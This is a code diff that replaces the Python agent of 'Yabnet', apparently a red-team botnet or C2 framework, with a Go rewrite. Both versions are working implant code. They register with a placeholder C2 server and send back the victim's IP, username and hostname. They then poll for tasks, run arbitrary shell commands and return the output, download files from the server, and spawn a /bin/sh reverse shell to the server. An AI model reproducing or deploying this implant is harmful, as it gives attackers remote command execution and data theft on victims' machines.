@@ -1,245 +1,265 @@
-import requests 
-import time
-import socket
-import json 
-import platform
-import subprocess
-import random
-import getpass  
-import os 
-from sys import exit
+/*
+Yabnet's agent program, written in go.
 
-"""
-TODO: Create a builder script which creates this agent script 
-with specific configurations.
+Current file is in construction and in debugging mode. Still learning golang...
+*/
 
-TODO4: Create persistence on the script itself. 
-"""
+package main
 
-# TODO: This agent is turning into a mess, I need a proper agent class 
-# with proper functions 
+import (
+	"encoding/json"
+	"io"
+	"io/ioutil"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"os/exec"
+	"os/user"
+	"strings"
+	"time"
+)
 
-# Debugging information  
+// Global Variable Declaration
+var SERVERIP string = "<SERVERIP>"
+var PORT string = "<PORT>"
+var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
+var URL string = "http://" + SERVERIP + ":" + PORT
 
-SERVERIP = '<SERVERIP>'
-PORT = <PORT>
+func GetOutboundIP() string {
+	conn, _ := net.Dial("udp", "8.8.8.8:80")
+	defer conn.Close()
+	localAddr := conn.LocalAddr().String()
+	idx := strings.LastIndex(localAddr, ":")
 
-URL = 'http://'+SERVERIP+':'+str(PORT)
-FIRSTCONTACTKEY = 'firstcontactkey'
+	return localAddr[0:idx]
+}
 
-def reverse_shell(port):
-    try:
-        # Stop hardcoding the serverip 
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((SERVERIP,port))
-    except Exception as e:
-        exit()
+// Return error type for error checking?
+// Think about os.Exit(1) in the error checking down below
+func simplePost(endpoint string, data url.Values) map[string]interface{} {
+	response, err := http.PostForm(endpoint, data)
 
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"]);
+	if err != nil {
+		//fmt.Println("[-] Error: ", err)
+		os.Exit(1)
+	}
 
-    os._exit(0)
+	defer response.Body.Close()
+	body, err := ioutil.ReadAll(response.Body)
 
-def get_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(('10.255.255.255', 1))
-        IP = s.getsockname()[0]
-    except:
-        IP = '127.0.0.1'
-    finally:
-        s.close()
+	if err != nil {
+		//fmt.Println("[-] Error:", err)
+		os.Exit(1)
+	}
 
-        return IP 
+	responseBody := string(body)
 
-def heartbeat(ip, user):
-    url = URL + '/heartbeat'
+	var jsonData map[string]interface{}
+	json.Unmarshal([]byte(responseBody), &jsonData)
 
-    data = {'ip': ip, 'user': user}
+	//fmt.Println(jsonData["result"])
 
-    try:
-        res = requests.post(url, data=data)
-        return True
-    except Exception as e:
-        return False
+	return jsonData
+}
 
-def firstcontact():
-    url = URL + '/firstcontact'
+func firstContact() string {
+	endpoint := URL + "/firstcontact"
 
-    data = {'firstcontactkey': FIRSTCONTACTKEY}
+	var data = url.Values{"firstcontactkey": {FIRSTCONTACTKEY}}
+	jsonData := simplePost(endpoint, data)
 
-    try:
-        res = requests.post(url, data=data)
-    except Exception as e:
-        return "[-]" + str(e)
+	if jsonData["result"] == "success" {
+		return jsonData["registerkey"].(string)
+	} else {
+		return jsonData["result"].(string)
+	}
+}
 
-    global REGISTERKEY
-    json_data = json.loads(res.text)
-    print(res.text)
-    REGISTERKEY = json_data['registerkey']
-    
-    return json_data['registerkey']
+func register(registerkey string, ip string, os_name string, user string) bool {
+	endpoint := URL + "/register"
 
-def register(ip, os, user):
-    url = URL + '/register'
+	var data = url.Values{
+		"registerkey": {registerkey},
+		"ip":          {ip},
+		"os":          {os_name},
+		"user":        {user}}
 
-    data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os, 'user': user}
+	jsonData := simplePost(endpoint, data)
 
-    try:
-        res = requests.post(url,data=data)
-        data = res.json()
+	if jsonData["result"] == "success" {
+		return true
+	} else {
+		//fmt.Println(jsonData["error"])
+		return false
+	}
+}
 
-    except Exception as e:
-        print("[DEBUG]", str(e))
+func heartbeat(registerkey string, ip string, user string) bool {
+	endpoint := URL + "/heartbeat"
 
-    if 'error' in data:
-        print("[DEBUG] Already registered, or some error have occurred.")
-        exit()
+	var data = url.Values{
+		"registerkey": {registerkey},
+		"ip":          {ip},
+		"user":        {user}}
 
+	jsonData := simplePost(endpoint, data)
 
-    #return REGISTERKEY
+	if jsonData["result"] == "success" {
+		return true
+	} else {
+		return false
+	}
 
-def fetchCommand(ip):
-    url = URL + '/bot/' + ip + '/task'
-    data = {'registerkey': REGISTERKEY}
+}
 
-    try:
-        res = requests.post(url, data=data)
-        json_data = json.loads(res.text)
-    
-    # Unable to connect to the server 
-    except Exception as e:
-        return '[-] ' + str(e)
+func fetchCommand(registerkey string, ip string) string {
+	endpoint := URL + "/bot/" + ip + "/task"
 
-    #print("[*] json_data = ", json_data)
+	var data = url.Values{"registerkey": {registerkey}}
 
-    # Command has not been staged. Return [-] and just sleep. 
-    if 'command' not in json_data:
-        return '[-] ' + str(json_data)
+	jsonData := simplePost(endpoint, data)
 
-    else:
-        command = json_data['command']
-        #print("[+] Command received: ", command)
-        # TODO: Add upload/download/shell related functionality of the agent here 
-        if "download" == command.split(' ')[0]:
-            try:
-                # The destination path might be a problem if the path has space in between. ex) C:\Program Files\ ... 
-                filename = command.split(' ')[1]
-                destination_path = command.split(' ')[2]
+	if jsonData["result"] == "success" {
+		return jsonData["command"].(string)
+	} else {
+		return jsonData["error"].(string)
+	}
 
-                data = {'registerkey': REGISTERKEY}
-                download_url = URL + '/download/' + filename
-                myFile = requests.post(download_url, data=data)
-                #print('[+]', myFile.content)
+}
 
-                open(destination_path,'wb').write(myFile.content)
+/*
+	Description: Executes commands that was fetched from the server.
+	The commands are categorized as "upload", "download", "shell", and simple_exec.
+	The function currently only supports simple_exec
+*/
 
+func submitResult(registerkey string, ip string, result string) {
+	endpoint := URL + "/bot/" + ip + "/result"
 
-            except Exception as e:
-                return "[DEBUG] File Download Failed: " + str(e) 
+	var data = url.Values{
+		"registerkey": {registerkey},
+		"result":      {result}}
 
-            return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 
+	simplePost(endpoint, data)
+	//fmt.Println(jsonData)
+}
 
-        elif "shell" == command.split(' ')[0]:
-            # Spawn an independent reverse shell through fork.
-            # This fork will actually spawn a new agent.py 
-            time.sleep(10)
-            try:
-                newpid = os.fork()
-                if newpid==0:
-                    port = int(command.split(' ')[1])
-                    reverse_shell(port)
+func reverseshell(serverip string, port string) {
+	server := serverip + ":" + port
+	conn, _ := net.Dial("tcp", server)
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Run()
+}
 
-                return "[+] Reverse shell created"
+func download(endpoint string, destination string) (err error) {
+	resp, err := http.Get(endpoint)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
 
-            except Exception as e:
-                print(str(e))
-                return "[-] " + str(e)
-            
-        #elif "upload" == command.split(' ')[0]: 
-        else:
-            # TODO: If the subprocess.check_output spawns a process ex) a meterpreter shell, the agent will hang 
-            try:
-                #result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
-                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                stdout,stderr = process.communicate()
-                result = stdout 
-            except Exception as e: 
-                #payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
-                return "Status: FAILED " + str(e) 
-        
-        return result.decode('utf-8') 
+	f, err := os.Create(destination)
+	if err != nil {
+		return
+	}
+	defer f.Close()
 
+	_, err = io.Copy(f, resp.Body)
+	return
+}
 
-def submit_result(ip, result):
-    url = URL + '/bot/' + ip + '/result'
-    
-    data = {'registerkey': REGISTERKEY, 'result': result}
+/*
+Description: Executes commands that was fetched from the server.
+The commands are categorized as "upload", "download", "shell", and simple_exec.
+The function currently only supports simple_exec
+*/
 
-    requests.post(url, data=data)
+// TODO: Work on this function
+func executeCommand(command string) string {
+	//argstr := []string("-c", command)
+	//out, err := exec.Command("/bin/bash", argstr).Output()
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
+	commandSlice := strings.Split(command, " ")
 
+	// Download file and save it into the local disk
+	if commandSlice[0] == "download" {
+		endpoint := URL + "/download/" + commandSlice[1]
+		download(endpoint, commandSlice[2])
+		return ""
 
-def main(): 
+		// Launch a reverse shell
+	} else if commandSlice[0] == "shell" {
+		port := commandSlice[1]
+		go reverseshell(SERVERIP, port)
+		return ""
 
-    # Figure out platform 
-    if "Linux" in platform.platform():
-        host_os = 'Nix'
-    elif "Windows" in platform.platform():
-        host_os = 'Windows'
-    else:
-        print("[-] Unidentifiable OS type")
+		// Execute a simple bash command, and return the output to /result endpoint
+	} else {
+		out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
+		if err != nil {
+			return err.Error() + string(out)
+		}
+		return string(out)
+	}
+}
 
-    host_os = socket.gethostname()
+func main() {
+	ip := GetOutboundIP()
+	user, _ := user.Current()
+	os_name, _ := os.Hostname()
+	username := user.Username
 
-    attempt = 1
+	registerkey := firstContact()
+	//fmt.Println("Reigster key = ", registerkey)
 
-    ip = get_ip()
-    user = getpass.getuser()
-    if "[-]" in firstcontact():
-        print("[DEBUG] Unable to make first contact.", str(firstcontact()))
-        exit()
-    register(ip,host_os,user)
+	register_result := register(registerkey, ip, os_name, username)
 
-    
-    while(1):
-        # Attempting for heartbeat 
-        heartbeat_result = heartbeat(ip,user)
+	// Register was not successful. Exit.
+	if register_result == false {
+		for i := 1; i < 5; i++ {
+			registerkey := firstContact()
+			register_result := register(registerkey, ip, os_name, username)
+			if register_result == true {
+				break
+			}
+			time.Sleep(10 * time.Second)
+		}
+	}
 
-        if not heartbeat_result:
-            print("[DEBUG] attempt: ", str(attempt))
-            firstcontact()
-            register(ip,host_os,user)
-            attempt += 1 
+	// Register was successful
+	for {
+		heartbeat_result := heartbeat(registerkey, ip, username)
 
-        if attempt > 10: 
-            print("[DEBUG] Server is dead for sure. Exiting.")
-            exit(1)
-        
-        # Heartbeat is successful. Fetching commands... 
-        if heartbeat_result is not False:
-            try:
-                result = fetchCommand(ip)
-            except Exception as e:
-                continue 
+		// Heartbeat failed. Retry heartbeat.
+		if heartbeat_result == false {
+			for i := 1; i < 5; i++ {
+				heartbeat_result := heartbeat(registerkey, ip, username)
+				if heartbeat_result == true {
+					break
+				}
+				time.Sleep(10 * time.Second)
+			}
+		}
 
-            # If server response that the bot doesn't have anything, just sleep.
-            if isinstance(result, str) and '[-]' in result:
-                print("[-] Sleeping...")
-                time.sleep(10)
-                continue
+		// Everything is fine. Try to fetch command.
+		command := fetchCommand(registerkey, ip)
 
-            #print("[DEBUG] Result:", result)
-            submit_result(ip, result)
+		if strings.Contains(command, "[-]") == true {
+			time.Sleep(10 * time.Second)
+			continue
+		}
 
-            print("[+] Command feteched and executed. Sleeping ... ")
-            
-        # This is for production. For PoC, just sleep for 10 seconds.
-        #timerandom = random.randint(10,20)
-        #time.sleep(timerandom)
-        time.sleep(10)
+		execute_result := executeCommand(command)
+		submitResult(registerkey, ip, execute_result)
 
+		time.Sleep(10 * time.Second)
 
-if __name__ == '__main__':
-    main()
+	}
+
+}
